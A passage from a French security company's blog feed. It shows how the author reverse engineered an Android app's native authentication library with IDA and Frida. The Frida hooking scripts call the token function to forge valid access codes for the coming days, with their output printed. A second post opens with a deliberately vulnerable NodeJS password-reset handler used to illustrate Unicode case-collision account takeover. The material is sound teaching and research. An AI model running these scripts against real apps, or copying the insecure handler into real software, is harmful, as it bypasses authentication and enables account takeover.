<div class="wp-block-image is-style-default"><figure class="aligncenter size-full"><img width="787" height="291" src="https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650879435.jpg" alt="" class="wp-image-2060" srcset="https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650879435.jpg 787w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650879435-300x111.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650879435-768x284.jpg 768w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650879435-60x22.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650879435-100x37.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650879435-200x74.jpg 200w" sizes="(max-width: 787px) 100vw, 787px" /><figcaption><em>décompilation de la fonction checkAuth dans la librairie native</em></figcaption></figure></div>



<p>Malheureusement pour nous, les développeurs ont compilé la librairie partagée avec l&#8217;option de compilation <code>-fvisibility=hidden</code> ! De ce fait, tous les symboles qui ne sont pas explicitement marqués avec un attribut de visibilité (comme <code>default</code>) ne seront pas présents dans le fichier ELF.</p>



<p>La fonction <code>Java_com_example_acceis_1auth_MainActivity_checkAuth</code> utilise dans son code C++ la macro préprocesseur suivante <code>JNIEXPORT</code> qui correspond à <code>#define JNIEXPORT __attribute__ ((visibility ("default")))</code>. C&#8217;est la raison pour laquelle son symbole est présent dans la librairie.<br><br>Cette macro est obligatoire pour toutes les fonctions appelées par l&#8217;application car le symbole est utilisé pour enregistrer la fonction native via l&#8217;appel à <code>RegisterNatives</code> dans la JVM et ensuite pour résoudre l&#8217;adresse de la fonction.</p>



<pre class="wp-block-code has-small-font-size"><code class="">$ nm --demangle --dynamic data/libacceis_auth.so | grep acceis
00008980 T Java_com_example_acceis_1auth_MainActivity_checkAuth
00008650 T Java_com_example_acceis_1auth_MainActivity_stringFromJNI</code></pre>



<ul><li><a href="https://stackoverflow.com/questions/19422660/when-to-use-jniexport-and-jnicall-in-android-ndk">https://stackoverflow.com/questions/19422660/when-to-use-jniexport-and-jnicall-in-android-ndk</a></li><li><a href="https://gcc.gnu.org/wiki/Visibility">https://gcc.gnu.org/wiki/Visibility</a></li></ul>



<p>Avec les noms de variables récupérées dans la décompilation de la classe Java on peut mettre à jour la décompilation d&#8217;IDA.</p>



<div class="wp-block-image is-style-default"><figure class="aligncenter size-full"><img width="569" height="369" src="https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650879705.jpg" alt="" class="wp-image-2066" srcset="https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650879705.jpg 569w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650879705-300x195.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650879705-60x39.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650879705-100x65.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650879705-200x130.jpg 200w" sizes="(max-width: 569px) 100vw, 569px" /><figcaption>renommage des symboles sous IDA via déduction et analyse de la classe Java</figcaption></figure></div>



<p><code>compute_today_password</code> a été identifiée comme la fonction qui vérifie si le token du jour est valide et dont le résultat booléen est retourné à l&#8217;application Java. Malheureusement, nous ne connaissons pas encore les deux premiers arguments de cette fonction, <code>v9</code> et <code>v7</code>.</p>



<p>Ces deux arguments résultent de l&#8217;appel à la fonction <code>sub_8AF0</code> et <code>sub_8B60</code>. En analysant ces deux fonctions on remarque un pattern :</p>



<pre class="wp-block-code has-small-font-size"><code lang="c" class="language-c">int __cdecl sub_8AF0(int a1, int a2, int a3)
{
  return (*(int (__cdecl **)(int, int, int))(*(_DWORD *)a1 + 736))(a1, a2, a3);
}


int __cdecl sub_8B60(int a1, int a2)
{
  return (*(int (__cdecl **)(int, int))(*(_DWORD *)a1 + 684))(a1, a2);
}</code></pre>



<p>Les deux fonctions utilisent un offset sur le premier paramètre afin d&#8217;accéder à une fonction puis de l&#8217;exécuter avec le reste des paramètres.</p>



<p>Ce pattern en C est typique de l&#8217;appel d&#8217;une fonction présente dans une structure.<code> a1</code> semble donc être une structure dont nous n&#8217;avons pas la définition, <code>736</code> et <code>684</code> deux offsets correspondant à deux fonctions différentes.<br><br>Il s&#8217;agit ici de l&#8217;appel à des fonctions JNI. Ces fonctions permettent d’interagir avec l&#8217;interface JNI comme par exemple les structures (types) définies par l&#8217;interface (<code>jbyte</code>, <code>jarray</code>, <code>jshort</code>, &#8230;).<br><br>Le premier paramètre, <code>a1</code> (ou <code>env</code> déjà renommé dans la fonction principale), est un pointeur sur une instance de la structure <code>JNIEnv</code>. Cette instance contient notamment une structure répertoriant l&#8217;ensemble des fonctions JNI disponibles.<br><br>Ainsi les appels via les <code>736</code> et <code>684</code> correspondent à des appels à fonctions JNI spécifiques. Une table des correspondances <code>offset:fonction</code> est disponible ici : <a href="https://docs.google.com/spreadsheets/d/1yqjFaY7mqyVIDs5jNjGLT-G8pUaRATzHWGFUgpdJRq8/edit#gid=0.">https://docs.google.com/spreadsheets/d/1yqjFaY7mqyVIDs5jNjGLT-G8pUaRATzHWGFUgpdJRq8/edit#gid=0.</a></p>



<p>On détermine alors que la fonction <code>sub_8AF0</code> appel <code>jbyte* (*GetByteArrayElements)(JNIEnv*, jbyteArray, jboolean*)</code> et <code>sub_8B60</code> appel <code>jsize (*GetArrayLength)(JNIEnv*, jarray)</code>.</p>



<ul class="has-small-font-size"><li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/functions.html">https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/functions.html</a></li><li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/types.html">https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/types.html</a></li><li><a href="https://en.wikipedia.org/wiki/Java_Native_Interface#:~:text=The%20JNI%20framework%20lets%20a,created%20by%20Java%20application%20code.">https://en.wikipedia.org/wiki/Java_Native_Interface#:~:text=The%20JNI%20framework%20lets%20a,created%20by%20Java%20application%20code</a></li></ul>



<h3><span class="has-inline-color has-primary-color">Ajout des symboles JNI dans IDA</span></h3>



<div class="wp-container-6 wp-block-group"><div class="wp-block-group__inner-container">
<p>On est plus avancé que tout à l&#8217;heure mais il est cependant plus pratique de rajouter la définition de la structure JNIEnv dans IDA et de retyper les arguments.</p>



<p>La première étape est de récupérer la définition C des structures JNI : <a href="https://gist.githubusercontent.com/Areizen/13eb7c7d0de7e0577a296a74508663b2/raw/4266b6b7b2746e0f1f2145b68085e8f04a235016/jni_ida_definitions.h">https://gist.githubusercontent.com/Areizen/13eb7c7d0de7e0577a296a74508663b2/raw/4266b6b7b2746e0f1f2145b68085e8f04a235016/jni_ida_definitions.h</a></p>
</div></div>



<p>Dans IDA :</p>



<ol><li>File</li><li>Load File</li><li>Parse C Header File et sélection du fichier <code>jni_ida_definitions.h</code></li></ol>



<p>Puis ajouter cette structure dans le projet</p>



<ol><li>Structures</li><li>Appuyer sur <em>INS</em></li><li>Add standard structure</li><li>Selectionner _JNIEnv</li></ol>



<div class="wp-block-image is-style-default"><figure class="aligncenter size-large is-resized"><img src="https://www.acceis.fr/voy_content/uploads/2022/04/add-lib-1024x541.jpg" alt="" class="wp-image-2067" width="1000" height="528" srcset="https://www.acceis.fr/voy_content/uploads/2022/04/add-lib-1024x541.jpg 1024w, https://www.acceis.fr/voy_content/uploads/2022/04/add-lib-300x159.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/04/add-lib-768x406.jpg 768w, https://www.acceis.fr/voy_content/uploads/2022/04/add-lib-60x32.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/04/add-lib-100x53.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/04/add-lib-200x106.jpg 200w, https://www.acceis.fr/voy_content/uploads/2022/04/add-lib.jpg 1376w" sizes="(max-width: 1000px) 100vw, 1000px" /><figcaption><em>Ajout de la structure JNIEnv dans IDA</em></figcaption></figure></div>



<p>Une fois la structure disponible on peut retyper les arguments dans la fonction principale et régénérer le pseudo-code.</p>



<div class="wp-container-7 wp-block-group"><div class="wp-block-group__inner-container">
<blockquote class="wp-block-quote"><p><em>le renommage de sub_8AF0 et sub_8B60 a été fait manuellement.</em></p></blockquote>
</div></div>



<div class="wp-block-image is-style-default"><figure class="aligncenter size-full"><img width="766" height="416" src="https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650880069.jpg" alt="" class="wp-image-2068" srcset="https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650880069.jpg 766w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650880069-300x163.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650880069-60x33.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650880069-100x54.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650880069-200x109.jpg 200w" sizes="(max-width: 766px) 100vw, 766px" /><figcaption><em>décompilation avec présence les types JNI</em></figcaption></figure></div>



<p>Du coté de l&#8217;appel des fonctions JNI, on remarque une certaine lisibilité retrouvée.</p>



<pre class="wp-block-code has-small-font-size"><code lang="c" class="language-c">jbyte *__cdecl sub_8AF0(_JNIEnv *env, jbyteArray username, int isCopy)
{
  return env-&gt;functions-&gt;GetByteArrayElements(env, username, isCopy);
}

jsize __cdecl call_jni_GetArrayLength(_JNIEnv *env, jarray username)
{
  return env-&gt;functions-&gt;GetArrayLength((JNIEnv *)env, username);
}</code></pre>



<p>Il s&#8217;agit bien des deux fonctions identifiées préalablement. Le code est maintenant plus clair et on identifie les deux premiers arguments qui sont respectivement l&#8217;username et sa longueur.<br><br> La fonction JNI <code>GetByteArrayElements</code> a permis de <em>convertir</em> le type <code>jbyteArray</code> vers le type <code>jbyte *</code> et <code>GetArrayLength</code> de récupérer la taille de ce tableau. Ces deux types peuvent être castés vers des types natifs sans problèmes comme dans la fonction <code>compute_today_password</code>.<br><br>Le processus de vérification de l&#8217;authentification parait maintenant simple, l&#8217;appareil génère le token du jour via l&#8217;username fourni et la date du système puis le compare avec le token fourni par l&#8217;utilisateur.<br>Cela nous facilite la tâche, il n&#8217;y a pas besoin de comprendre comment le token est vérifié, la librairie est capable d&#8217;en générer des valides !</p>



<h2><span class="has-inline-color has-black-color">Introspection avec Frida</span></h2>



<p>Il existe maintenant plusieurs méthodes pour générer des tokens :</p>



<ul class="has-small-font-size"><li>Implémenter la fonction <code>compute_today_password</code> en python</li><li>Écrire un programme C ou Java qui appel la méthode de la librairie</li><li>Émuler la fonction via unicorn engine en python</li><li>Utiliser Frida sur la machine et appeler directement la fonction via Javascript / Python</li></ul>



<p>La première méthode est pratique mais sensible aux erreurs de développement, runtime et compréhension. La seconde est plus fiable mais moins pratique car la librairie est compilée pour une architecture autre que celle de notre machine. Il faudrait configurer un qemu, une toolchain cross compilation et trouver la bonne architecture ARM.</p>



<div class="wp-container-9 wp-block-group"><div class="wp-block-group__inner-container">
<blockquote class="wp-block-quote"><p><em>Dans le contexte originale l&#8217;architecture cible était ARMEABI 5, notre tireuse est en x86.</em></p></blockquote>



<p>Frida est un outil permettant d&#8217;instrumentaliser dynamiquement le code d&#8217;applications natives ou non. De façon brève, il injecte une partie de son code dans la mémoire d&#8217;un autre processus et expose une interface en javascript pour interagir avec le processus dans lequel il est injecté.<br><br>Frida est ainsi parfait dans notre contexte, nous avons accès au processus et pouvons donc injecter Frida. Une fois injecté, nous pourrons développer un script JS permettant d&#8217;appeler la fonction native qui sera déjà chargée dans la mémoire du processus. Ainsi, nul besoin de compiler ou émuler quoi que ce soit.<br><br>La première étape est de télécharger le serveur Frida pour notre architecture : <a href="https://github.com/frida/frida/releases/download/15.1.17/frida-server-15.1.17-android-x86.xz">https://github.com/frida/frida/releases/download/15.1.17/frida-server-15.1.17-android-x86.xz</a><br>Puis de l&#8217;installer sur notre cybertireuse.</p>



<div class="wp-block-image is-style-default"><figure class="aligncenter size-full"><img width="885" height="582" src="https://www.acceis.fr/voy_content/uploads/2022/04/frida-start.png" alt="" class="wp-image-2069" srcset="https://www.acceis.fr/voy_content/uploads/2022/04/frida-start.png 885w, https://www.acceis.fr/voy_content/uploads/2022/04/frida-start-300x197.png 300w, https://www.acceis.fr/voy_content/uploads/2022/04/frida-start-768x505.png 768w, https://www.acceis.fr/voy_content/uploads/2022/04/frida-start-60x39.png 60w, https://www.acceis.fr/voy_content/uploads/2022/04/frida-start-100x66.png 100w, https://www.acceis.fr/voy_content/uploads/2022/04/frida-start-200x132.png 200w" sizes="(max-width: 885px) 100vw, 885px" /><figcaption><em>mise en place de frida</em> via adb</figcaption></figure></div>



<p>Frida propose plusieurs façons de s&#8217;insérer dans le processus. Soit Frida lance le processus lui-même et s’insère, soit on spécifie le processus et Frida s&#8217;y attache. Dans notre cas le service est en cours d&#8217;utilisation par les collègues, hors de question de DOS la tireuse a bière, SPOF d&#8217;ACCEIS. Nous utiliserons ainsi la seconde méthode.<br><br>Une fois le serveur lancé, <code>frida-ps</code> nous permet de lister les processus actuellement en exécution. On indique alors à Frida de s&#8217;injecter dans le processus <code>acceis_auth</code> via <code>frida -U acceis_auth</code>.<br><br>Une fois injecté nous avons accès au processus via l&#8217;interface de Frida.</p>



<div class="wp-block-image is-style-default"><figure class="aligncenter size-large"><img width="1024" height="664" src="https://www.acceis.fr/voy_content/uploads/2022/04/frida-discover-1024x664.png" alt="" class="wp-image-2072" srcset="https://www.acceis.fr/voy_content/uploads/2022/04/frida-discover-1024x664.png 1024w, https://www.acceis.fr/voy_content/uploads/2022/04/frida-discover-300x195.png 300w, https://www.acceis.fr/voy_content/uploads/2022/04/frida-discover-768x498.png 768w, https://www.acceis.fr/voy_content/uploads/2022/04/frida-discover-60x39.png 60w, https://www.acceis.fr/voy_content/uploads/2022/04/frida-discover-100x65.png 100w, https://www.acceis.fr/voy_content/uploads/2022/04/frida-discover-200x130.png 200w, https://www.acceis.fr/voy_content/uploads/2022/04/frida-discover.png 1183w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption><em>interaction avec le processus courant et liste des modules chargés</em></figcaption></figure></div>



<p>La fonction <code>Process.enumerateModules</code> de l&#8217;API Frida permet de lister les modules chargée et leurs informations. On remarque alors que la librairie <code>libacceis_auth.so </code>est chargée à l&#8217;adresse <code>0xc3f80000</code>. On pourrait <em>rebaser</em> le segment<code> .text</code> dans IDA afin d&#8217;avoir les bonnes adresses de fonction mais passons.</p>



<blockquote class="wp-block-quote"><p>Attention, si vous ne voyez pas le module cible dans la liste des modules c&#8217;est qu&#8217;il n&#8217;a pas été chargé. Le chargement du module n&#8217;est pas automatique et est réalisé lors de l’exécution<em> System.loadLibrary. Si l&#8217;application crash et vient de redémarrer le code se chargeant de charger la librairie n&#8217;a peut être pas encore été déclenché.</em></p></blockquote>



<p class="code { background-color: red}">Frida propose des fonctionnalités pour hooker des fonctions, cela permet d&#8217;exécuter du code avant et après l&#8217;appel à la fonction afin d&#8217;en détourner le fonctionnement ou simplement à des fins d&#8217;observation.<br><br>Pour hooker une fonction il est nécessaire de récupérer son adresse en mémoire. La fonction se trouve à l&#8217;adresse mémoire à laquelle est chargée sa librairie + l&#8217;offset de la fonction dans la libraire.</p>



<pre class="wp-block-code has-small-font-size"><code lang="c" class="language-c">base_addr = 0xc3f80000
offset = 0x88E0 ; récupéré via IDA
compute_today_password = base_addr + offset = 0xc3f888e0</code></pre>



<div class="wp-container-8 wp-block-group"><div class="wp-block-group__inner-container">
<blockquote class="wp-block-quote"><p><em>Normalement la méthode <code>Module.findExportByName(module, fonction) </code>permet de récupérer l&#8217;adresse de la fonction par son nom. Cependant, dans le cas présent le symbole de <code>compute_today_password </code>n&#8217;est pas présent.</em></p></blockquote>
</div></div>



<p>Frida nous permet de faire ce calcul pour nous.</p>



<pre class="wp-block-code has-small-font-size"><code lang="javascript" class="language-javascript">Java.perform(function () {

    var libacceis = Process.enumerateModules().filter((item) =&gt; { return item["name"] == "libacceis_auth.so" })[0]
    var addr = libacceis.base.add(0x88e0)
    
    console.log(addr)
})</code></pre>



<p>Indiquons à Frida d&#8217;exécuter notre bout de code Javascript via : <code>frida -U acceis_auth -l scripts/watcher.js</code></p>



<pre class="wp-block-code has-small-font-size"><code lang="bash" class="language-bash">     ____
    / _  |   Frida 15.1.17 - A world-class dynamic instrumentation toolkit
   | (_| |
    &gt; _  |   Commands:
   /_/ |_|       help      -&gt; Displays the help system
   . . . .       object?   -&gt; Display information about 'object'
   . . . .       exit/quit -&gt; Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to Android Emulator 5554 (id=emulator-5554)
Attaching...
0xc3f888e0
[Android Emulator 5554::acceis_auth ]-&gt;</code></pre>



<h3><span class="has-inline-color has-primary-color">Hook de la génération de tokens</span></h3>



<p>Nous allons maintenant hooker la fonction <code>compute_today_password</code> afin de consulter ces paramètres et modifications effectuées en mémoire.</p>
</div></div>



<pre class="wp-block-code has-small-font-size"><code lang="javascript" class="language-javascript">Java.perform(function () {

    var libacceis = Process.enumerateModules().filter((item) =&gt; { return item["name"] == "libacceis_auth.so" })[0]
    var addr = libacceis.base.add(0x88e0)


    Interceptor.attach(addr, {
        onEnter: function(args) {
            var username_addr = args[0]
            var username_size = args[1]
            var current_date = args[2]
            this.buffer = args[3]

            var username = Memory.readCString(username_addr, username_size.toUInt32())
            console.log('[before]')
            console.log("username: " + username)
            console.log("date: " + current_date.toUInt32())
            console.log('')

        },
        onLeave: function(retval) {
            var generated_code = Memory.readByteArray(this.buffer, 8);
            var code = Array.from(new Uint8Array(generated_code)).map((item) =&gt; item.toString(16)).join("")
            console.log('[before]')
            console.log("generated code: " + code)
            console.log(generated_code)
        }
    })

})</code></pre>



<p>Une fois le script chargé, nous avons plus qu&#8217;à nous authentifier, peu importe le mot de passe, afin que le service génère le token et que Frida nous l&#8217;affiche gentiment.</p>



<div class="wp-block-image is-style-default"><figure class="aligncenter size-large"><img width="1024" height="562" src="https://www.acceis.fr/voy_content/uploads/2022/04/watcher-1024x562.gif" alt="" class="wp-image-2074" srcset="https://www.acceis.fr/voy_content/uploads/2022/04/watcher-1024x562.gif 1024w, https://www.acceis.fr/voy_content/uploads/2022/04/watcher-300x165.gif 300w, https://www.acceis.fr/voy_content/uploads/2022/04/watcher-768x421.gif 768w, https://www.acceis.fr/voy_content/uploads/2022/04/watcher-1536x843.gif 1536w, https://www.acceis.fr/voy_content/uploads/2022/04/watcher-60x33.gif 60w, https://www.acceis.fr/voy_content/uploads/2022/04/watcher-100x55.gif 100w, https://www.acceis.fr/voy_content/uploads/2022/04/watcher-200x110.gif 200w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption><em>récupération en mémoire du code générée par le service</em></figcaption></figure></div>



<h3><span class="has-inline-color has-primary-color">Appel de la fonction native avec Frida</span></h3>



<p>Nous avons volé le code du jour ! Cependant, il est souhaitable d&#8217;obtenir des codes à l&#8217;avance afin de ne pas nous connecter à la tireuse chaque jour (ça fait du bruit dans les logs).<br>Pour cela on peut passer par Frida pour effectuer nous même les appels à la fonction.</p>



<pre class="wp-block-code has-small-font-size"><code lang="javascript" class="language-javascript">Java.perform(function () {

    var libacceis = Process.enumerateModules().filter((item) =&gt; { return item["name"] == "libacceis_auth.so" })[0]
    var addr = libacceis.base.add(0x88e0)


    var generate_new_code = new NativeFunction(addr, 'void', ['pointer', 'int', 'int', 'pointer'])

    var username = Memory.allocUtf8String("switch22");
    var buffer = Memory.alloc(8)
    var date = '042022'
    var today = 23
    
    for (var i = 0; i &lt; 7; i++) {
        
        var day = today + i

        generate_new_code(username, 8, parseInt(day + date, 10), buffer)

        var generated_code = Memory.readByteArray(buffer, 8)
        var code = Array.from(new Uint8Array(generated_code)).map((item) =&gt; item.toString(16)).join("")
        console.log("code du " + day + "/04/2022 : " + code)
    }

})</code></pre>



<p>Changeons la date du système pour le 26 Avril 2022 et demandons à Frida de nous générer les codes des 7 prochains jours.</p>



<div class="wp-block-image is-style-default"><figure class="aligncenter size-large"><img width="1024" height="579" src="https://www.acceis.fr/voy_content/uploads/2022/04/generated-2-1024x579.gif" alt="" class="wp-image-2077" srcset="https://www.acceis.fr/voy_content/uploads/2022/04/generated-2-1024x579.gif 1024w, https://www.acceis.fr/voy_content/uploads/2022/04/generated-2-300x170.gif 300w, https://www.acceis.fr/voy_content/uploads/2022/04/generated-2-767x434.gif 767w, https://www.acceis.fr/voy_content/uploads/2022/04/generated-2-1536x869.gif 1536w, https://www.acceis.fr/voy_content/uploads/2022/04/generated-2-60x34.gif 60w, https://www.acceis.fr/voy_content/uploads/2022/04/generated-2-100x57.gif 100w, https://www.acceis.fr/voy_content/uploads/2022/04/generated-2-200x113.gif 200w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption><em>appel de la fonction JNI directement depuis Frida</em></figcaption></figure></div>



<p>Frida a ainsi simplement généré 7 codes valides en appelant la fonction et incrémentant la date.</p>



<pre class="wp-block-code has-small-font-size"><code class="">     ____
    / _  |   Frida 15.1.17 - A world-class dynamic instrumentation toolkit
   | (_| |
    &gt; _  |   Commands:
   /_/ |_|       help      -&gt; Displays the help system
   . . . .       object?   -&gt; Display information about 'object'
   . . . .       exit/quit -&gt; Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to Android Emulator 5554 (id=emulator-5554)
Attaching...   
                                                         
code du 23/04/2022 : 95e0367585ff6d33
code du 24/04/2022 : 55ad77545b25c33
code du 25/04/2022 : 156b17755744c33
code du 26/04/2022 : d529e475c536bf33
code du 27/04/2022 : 95d7f57585c8ae33
code du 28/04/2022 : 5594c275458b9933
code du 29/04/2022 : 1552d27554d8933</code></pre>



<p>Les codes générés sont peu aléatoires, un reverse engineering de la fonction de génération du code et sa cryptanalyse aurait pu nous  mener simplement à ce même résultat. Il faut cependant garder à l&#8217;esprit que l&#8217;application originale possède une fonction bien plus velue.</p>



<p>Nous voici ainsi avec de la bière pendant nos congés et avec une disclosure éthique et responsable à écrire.</p>



<h3><span class="has-inline-color has-primary-color">Ressources</span></h3>



<ul class="has-small-font-size"><li><a href="https://erev0s.com/blog/how-hook-android-native-methods-frida-noob-friendly/">https://erev0s.com/blog/how-hook-android-native-methods-frida-noob-friendly/</a></li><li><a href="https://frida.re/docs/javascript-api/">https://frida.re/docs/javascript-api/</a></li><li><a href="https://developer.android.com/training/articles/perf-jni#general-tips">https://developer.android.com/training/articles/perf-jni#general-tips</a></li><li><a href="https://riptutorial.com/android/example/14535/how-to-call-functions-in-a-native-library-via-the-jni-interface">https://riptutorial.com/android/example/14535/how-to-call-functions-in-a-native-library-via-the-jni-interface</a></li><li><a href="https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/reversing-native-libraries">https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/reversing-native-libraries</a></li><li><a href="https://poxyran.github.io/poxyblog/src/pages/02-11-2019-calling-native-functions-with-frida.html#readprocessmemory1">https://poxyran.github.io/poxyblog/src/pages/02-11-2019-calling-native-functions-with-frida.html#readprocessmemory1</a></li><li><a href="https://neo-geo2.gitbook.io/adventures-on-security/frida-scripting-guide/primitive-types">https://neo-geo2.gitbook.io/adventures-on-security/frida-scripting-guide/primitive-types</a></li><li><a href="https://www3.ntu.edu.sg/home/ehchua/programming/java/javanativeinterface.html">https://www3.ntu.edu.sg/home/ehchua/programming/java/javanativeinterface.html</a></li></ul>



<h2 id="à-propos-de-lauteur"><span class="has-inline-color has-black-color">À propos de l’auteur</span></h2>



<p>Article et présentation rédigés par Lucas Gasté aka&nbsp;<a href="https://0xswitch.fr/">switch</a>, auditeur sécurité chez <a href="https://www.acceis.fr/">ACCEIS</a>.</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/frida-jni-et-8-6/">Frida, JNI et 8.6</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Attaques Unicode &#8211; Rump BreizhCTF 2k22</title>
		<link>https://www.acceis.fr/attaques-unicode-rump-breizhctf-2k22/</link>
		
		<dc:creator><![CDATA[Alexandre Zanni]]></dc:creator>
		<pubDate>Fri, 15 Apr 2022 05:13:10 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[Outils et méthodes]]></category>
		<category><![CDATA[unicode]]></category>
		<guid isPermaLink="false">https://www.acceis.fr/?p=1951</guid>

					<description><![CDATA[<p>Introduction Dans le cadre de mon activité de Recherche et Développement (R&#38;D) au sein du Pôle d’Expertise Technique d’ACCEIS, je suis amené à travailler un projet de recherche autour de la sécurité d’Unicode. Au sein de ce projet, toujours en cours, je tente d’aborder les thématiques suivantes : le fonctionnement d’Unicode, les problématiques de conception [&#8230;]</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/attaques-unicode-rump-breizhctf-2k22/">Attaques Unicode &#8211; Rump BreizhCTF 2k22</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></description>
										<content:encoded><![CDATA[
<h2 id="introduction"><span class="has-inline-color has-black-color">Introduction</span></h2>



<p>Dans le cadre de mon activité de Recherche et Développement (R&amp;D) au sein du Pôle d’Expertise Technique d’ACCEIS, je suis amené à travailler un projet de recherche autour de la sécurité d’Unicode. Au sein de ce projet, toujours en cours, je tente d’aborder les thématiques suivantes : le fonctionnement d’Unicode, les problématiques de conception et liées à l’utilisation d’Unicode, les attaques ciblant ou utilisant Unicode, comment l’environnement informatique et les outils de développement peuvent permettre de détecter et se protéger de ces attaques.</p>



<p>Le 01 et 02 Avril 2022 s’est tenu le BreizhCTF 2k22, édition 2022 de l’évènement de cybersécurité Rennais incluant les activités suivantes :</p>



<ul><li>Ateliers découverte des métiers de la cybersécurité ;</li><li>Hack &amp; Job : rencontre entreprises et candidats ;</li><li>Rumps : présentations brèves (de 5 minutes) de sujets en lien avec la cybersécurité ;</li><li>Discours de clôture :
<ul>
<li>Guillaume POUPARD, rétrospective des 15 dernières années de la cybersécurité française à travers le prisme de l’ANSSI ;</li>
<li>Alex BERGER, comment la série TV <em>le Bureau des Légendes</em> est utile à la sensibilisation à la cybersécurité au plus grand nombre ;</li>
</ul>
</li><li>CTF : compétition de hacking informatique.</li></ul>



<p>C’est donc à l’occasion de cet évènement que j’ai pu présenter cette <em>Rump</em> de 5 minutes mettant en lumière deux exemples d’attaques abusant de la complexité d’Unicode.</p>



<p><a href="https://github.com/Acceis/rump-unicode">Répertoire Github</a> contenant le support de présentation.</p>



<h2 id="la-présentation"><span class="has-inline-color has-black-color">La présentation</span></h2>



<h3><span class="has-inline-color has-primary-color">Collision par transformation de casse</span></h3>



<p>Le premier exemple expose une attaque de <strong>prise de contrôle du compte par réinitialisation de mot de passe</strong> (<em>Account takeover via password reset</em>) en utilisant une <strong>collision par transformation de casse</strong> (<em>Case transformation collision</em>) comme vecteur inspiré par l’article <em>Hacking Unicode Like a Boss</em> de Charlie ERIKSEN (28/02/2020, <a href="https://www.bugcrowd.com/blog/hacking-unicode-like-a-boss/">Bugcrowd Blog</a>).</p>



<p>Afin d’illustrer l’attaque, le bloc de code NodeJS suivant sera utilisé :</p>



<pre class="wp-block-code"><code lang="javascript" class="language-javascript line-numbers">app.post('/api/password/reset', function(req, res) {
  var email = req.body.email;
  db.get('SELECT id, email, FROM users WHERE email = ?',
    [email.toLowerCase()],
    (err, user) =&gt; {
      if (err) {
        console.error(err.message);
        res.status(400).send();
      } else {
        generateTemporaryPassword((tempPassword) =&gt; {
          accountRepository.resetPassword(user.id, tempPassword, () =&gt; {
            messenger.sendPasswordResetEmail(email, tempPassword);
            res.status(204).send();
          });
        });
      }
    });
});</code></pre>



<p>On observe le comportement suivant :</p>



<ol type="1"><li>L’adresse email renseignée par l’utilisateur est convertie en minuscule afin de normaliser la comparaison (on peut imaginer que toutes les adresses email en base de données sont stockées en minuscule pour la consistance)</li><li>L’adresse email ainsi formatée est comparée aux entrées présentes dans la base de données afin de vérifier si elle y existe</li><li>Si elle existe, un mot de passe temporaire ou plutôt un lien de réinitialisation unique sera généré pour l’utilisateur correspondant</li><li>Un email sera envoyé à l’adresse email telle que fournie par l’utilisateur</li></ol>



<p>Dans le doux monde de l’ASCII tout va bien, mais dans le rude monde de l’Unicode un loup pourrait se présenter dans la bergerie.</p>



<p>Au moins deux mauvaises pratiques s’additionnent ici :<code class="sourceCode javascript"><code class="sourceCode javascript"></code></code></p>



<ol type="1"><li>La pseudo-normalisation des chaînes de caractère en utilisant la fonction <code>.toLowerCase()</code> (le cœur du problème qui sera étudié par la suite)</li><li>L’envoi d’email à l’adresse email fournie par l’utilisateur plutôt que celle récupérée en base de données</li></ol>



<p>Comme mentionné dans la <a href="https://www.ietf.org/rfc/rfc2142.txt">RFC 2142</a>, les adresses email ne sont pas sensibles à la casse. C’est certainement avec cette idée en tête que le développeur à naïvement tenté d’utiliser la fonction <code>.toLowerCase()</code> afin de pouvoir effectuer une comparaison consistante. L’intention était donc de normaliser ce que l’utilisateur aurait pu fournir comme format (<code>Admin@hackceis.pw</code>, <code>ADMIN@hackceis.pw</code>, <code>admin@HACKCEIS.fr</code>, etc.) en un format consistant (<code>admin@hackceis.pw</code>).</p>



